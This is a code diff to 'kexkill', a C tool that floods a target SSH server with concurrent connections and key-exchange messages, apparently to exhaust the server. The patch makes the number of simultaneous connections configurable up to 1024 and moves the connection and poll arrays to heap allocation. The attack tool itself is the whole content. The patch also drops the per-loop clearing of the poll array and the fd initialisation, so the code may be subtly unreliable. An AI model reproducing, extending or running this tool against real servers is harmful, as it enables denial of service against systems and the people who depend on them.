@@ -46,7 +46,10 @@
 #include <string.h>
 #include <unistd.h>
 
-#define MAXCONCUR	 128
+#define DEFMAXCONNS	32
+#define MAXMAXCONNS	1024
+
+static long maxconns;
 
 static struct kk_conn {
 	int	 fd;
@@ -58,7 +61,7 @@ static struct kk_conn {
 	} state;
 	size_t	 buflen;
 	char	 buf[2048];
-} conns[MAXCONCUR];
+} *conns;
 
 static char banner[] = "SSH-2.0-kexkill\r\n";
 static char kexinit[] =
@@ -263,13 +266,14 @@ fail:
 static int
 kexkill(struct sockaddr *sa, socklen_t salen)
 {
-	struct pollfd pfd[MAXCONCUR];
+	struct pollfd *pfd;
 	int i, k, n, ret;
 
+	if ((pfd = calloc(maxconns, sizeof *pfd)) == NULL)
+		err(1, "calloc()");
 	k = 0;
 	for (;;) {
-		memset(&pfd, 0, sizeof pfd);
-		for (i = n = 0; i < MAXCONCUR; ++i) {
+		for (i = n = 0; i < maxconns; ++i) {
 			if (conns[i].state == kk_closed) {
 				if (kk_connect(&conns[i], sa, salen) == 0)
 					k++;
@@ -287,13 +291,13 @@ kexkill(struct sockaddr *sa, socklen_t salen)
 		if (verbose > 1)
 			warnx("polling %d/%d connections", n, k);
 		// usleep(1000000);
-		if ((ret = poll(pfd, MAXCONCUR, -1)) < 0 && errno != EINTR)
+		if ((ret = poll(pfd, maxconns, -1)) < 0 && errno != EINTR)
 			err(1, "poll()");
 		if (ret <= 0)
 			continue;
 		if (verbose > 1)
 			warnx("polled %d events", ret);
-		for (i = 0; i < MAXCONCUR; ++i) {
+		for (i = 0; i < maxconns; ++i) {
 			if (pfd[i].fd == 0)
 				continue;
 			if (pfd[i].revents & (POLLERR|POLLHUP)) {
@@ -315,7 +319,7 @@ static void
 usage(void)
 {
 
-	fprintf(stderr, "usage: kexkill [-v] host[:port]\n");
+	fprintf(stderr, "usage: kexkill [-v] [-n maxconn] host[:port]\n");
 	exit(1);
 }
 
@@ -323,11 +327,18 @@ int
 main(int argc, char *argv[])
 {
 	struct addrinfo *res, *reslist, hints;
-	char *host, *service;
-	int i, eai, opt;
+	char *end, *host, *service;
+	int eai, opt;
 
-	while ((opt = getopt(argc, argv, "v")) != -1)
+	maxconns = DEFMAXCONNS;
+
+	while ((opt = getopt(argc, argv, "n:v")) != -1)
 		switch (opt) {
+		case 'n':
+			maxconns = strtol(optarg, &end, 10);
+			if (end == optarg || *end != '\0')
+				usage();
+			break;
 		case 'v':
 			verbose++;
 			break;
@@ -341,15 +352,18 @@ main(int argc, char *argv[])
 	if (argc != 1)
 		usage();
 
+	if (maxconns < 1 || maxconns > MAXMAXCONNS)
+		errx(1, "connection limit must be between 1 and %d.",
+		    MAXMAXCONNS);
+
 	host = argv[0];
 	if ((service = strchr(host, ':')) != NULL)
 		*service++ = '\0';
 	else
 		service = (char *)(uintptr_t)"ssh";
 
-	memset(&conns, 0, sizeof conns);
-	for (i = 0; i < MAXCONCUR; ++i)
-		conns[i].fd = -1;
+	if ((conns = calloc(maxconns, sizeof *conns)) == NULL)
+		err(1, "calloc()");
 
 	memset(&hints, 0, sizeof hints);
 	hints.ai_socktype = SOCK_STREAM;
